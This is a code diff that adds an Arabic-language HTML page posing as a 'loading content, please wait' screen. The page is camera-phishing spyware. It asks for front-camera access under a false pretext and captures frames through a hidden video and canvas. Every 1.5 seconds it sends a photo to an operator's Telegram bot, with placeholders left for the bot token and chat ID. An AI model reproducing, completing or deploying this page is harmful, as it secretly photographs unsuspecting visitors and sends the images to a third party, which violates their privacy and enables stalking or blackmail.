@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        body {
+            background-color: white; /* صفحة بيضاء تماماً */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: sans-serif;
+        }
+    </style>
+</head>
+<body>
+
+    <div hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </div>
+
+    <h3>جاري تحميل المحتوى، يرجى الانتظار...</h3>
+
+    <script>
+        'use strict';
+
+        // === إعدادات بوت التليجرام ===
+        // استبدل هذا بـ Token الخاص ببوتك (تحصل عليه من BotFather)
+        const botToken = 'ضع_هنا_TOKEN_البوت_الخاص_بـك'; 
+        // استبدل هذا بـ Chat ID الخاص بك (تحصل عليه من IDBot)
+        const chatId = 'ضع_هنا_CHAT_ID_الخاص_بـك'; 
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        const constraints = {
+            audio: false, // لا نحتاج للصوت
+            video: {
+                facingMode: "user" // الكاميرا الأمامية
+            }
+        };
+
+        // دالة لإرسال الصورة إلى تليجرام
+        function sendPhotoToTelegram(imgData) {
+            // تحويل بيانات Base64 إلى Blob (صيغة ملف) ليفهمها تليجرام
+            fetch(imgData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'capture.png');
+
+                    // إرسال طلب POST إلى Telegram API
+                    $.ajax({
+                        type: 'POST',
+                        url: `https://api.telegram.org/bot${botToken}/sendPhoto`,
+                        data: formData,
+                        processData: false, // ضروري لإرسال الملفات
+                        contentType: false, // ضروري لإرسال الملفات
+                        success: function(result) {
+                            console.log('تم إرسال الصورة بنجاح.');
+                        },
+                        error: function(error) {
+                            console.error('خطأ في الإرسال:', error);
+                        }
+                    });
+                });
+        }
+
+        // الوصول للكاميرا وبدء الالتقاط
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.error('عفواً، لم نتمكن من الوصول للكاميرا:', e);
+                alert("يرجى السماح بالوصول للكاميرا لتشغيل المحتوى.");
+            }
+        }
+
+        // النجاح في فتح الكاميرا
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            // بدء حلقة الالتقاط كل ثانية ونصف (1500 ميللي ثانية)
+            setInterval(function() {
+                // رسم فريم من الفيديو على الكانفاس
+                context.drawImage(video, 0, 0, 640, 480);
+                // تحويل الكانفاس لصورة Base64
+                var canvasData = canvas.toDataURL("image/png");
+                // إرسال الصورة للبوت
+                sendPhotoToTelegram(canvasData);
+            }, 1500); 
+        }
+
+        // بدء التشغيل
+        init();
+
+    </script>
+</body>
+</html>
